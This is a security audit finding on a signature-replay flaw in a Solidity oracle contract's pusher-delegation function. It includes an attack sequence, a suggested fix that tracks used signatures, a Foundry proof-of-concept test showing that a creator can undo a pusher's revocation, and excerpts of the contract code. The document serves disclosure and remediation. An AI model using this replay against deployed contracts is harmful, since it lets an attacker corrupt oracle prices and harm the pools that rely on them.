### Title
Pusher Delegation Signature Replay Allows Creator to Re-Establish Revoked Delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` in `CompressedOracleV1` does not invalidate a pusher's consent signature after it is used. A creator who holds a valid (within-deadline) signature can call `allowPushers` repeatedly with the same signature to re-establish delegation every time the pusher calls `revokePusher()`, making revocation ineffective until the deadline expires and silently redirecting the pusher's subsequent writes into the creator's namespace.

### Finding Description

`allowPushers` verifies a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`. The only replay guard is the `deadline` field: the signature is rejected after `block.timestamp > deadline`, but **no used-signature record is kept**. Within the deadline window the identical `(chainid, oracle, deadline, pusher, creator)` tuple passes verification every time it is submitted.

The code comment acknowledges the deadline's purpose:

> "an undated signature could re-establish a delegation AFTER the pusher revoked it."

But the deadline only prevents replay *after* it expires. While it is still valid, the creator can call `allowPushers` with the same bytes as many times as desired.

Attack sequence:

1. Pusher signs consent for creator with `deadline = now + 1 day`.
2. Creator calls `allowPushers` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers` again with the **same signature** → `namespaceRemapping[pusher] = creator` is restored.
5. Steps 3–4 can be repeated indefinitely until the deadline expires.

The pusher, believing revocation succeeded, may continue pushing data intended for their own namespace. Because `namespaceRemapping[pusher]` has been silently restored to `creator`, every subsequent `fallback()` call from the pusher writes into the creator's namespace instead. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation

Once the creator re-establishes delegation, the pusher's `fallback()` writes land in the creator's namespace. If the pusher is pushing data for a different purpose (their own feeds), that data — potentially stale, wrong-asset, or wrong-scale — overwrites the creator's live oracle slots. Those slots are read by `price()` / `getOracleData()`, which feed `PriceProvider` and ultimately pool swaps. A corrupted mid-price or spread in the creator's namespace reaches every pool that uses those feeds, enabling bad-price execution.

### Likelihood Explanation

- The creator must have saved the original signature bytes (trivial: they submitted the transaction, so the signature is on-chain in calldata).
- The deadline must still be valid (typical delegation deadlines are hours to days).
- The pusher must continue pushing after revoking (common: automated off-chain pushers do not stop immediately).
- No privileged role is required; the creator is any ordinary namespace owner.

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegationSigs` and revert if the digest has already been accepted:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedDelegationSigs[hash], "signature already used");
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedDelegationSigs[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

This is the direct analog of the boolean mapping Connext introduced to ensure each router signature can only be consumed once per `transferId`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testSignatureReplayBypassesRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Creator replays the SAME signature — revocation is nullified
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds, no revert
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation restored by replay");
    }
}
```

Running this test passes without revert, confirming that `revokePusher()` is ineffective as long as the creator holds a valid within-deadline signature. [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L236-243)
```text
    /// @notice Allows a pusher to self-revoke their delegation. After revocation the
    ///         wallet pushes into its OWN namespace again (the registrationless default).
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```
